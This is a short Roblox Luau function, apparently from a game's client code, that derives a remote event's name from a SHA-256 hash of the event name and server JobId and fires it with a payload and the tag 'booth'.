local function fireObfuscatedRemote(eventName, payload)
    local jobId = RunService:IsStudio() and "" or game.JobId
    local rawString = eventName .. jobId
    local hash = EncodingService:ComputeBufferHash(buffer.fromstring(rawString), Enum.HashAlgorithm.Sha256)
    local base64 = EncodingService:Base64Encode(hash)
    local finalName = buffer.tostring(base64)
    
    local remotesFolder = ReplicatedStorage:FindFirstChild("Remotes")
    if remotesFolder then
        local remote = remotesFolder:FindFirstChild(finalName)
        if remote and remote:IsA("RemoteEvent") then
            pcall(function() remote:FireServer(payload, "booth") end)
        end
    end
end

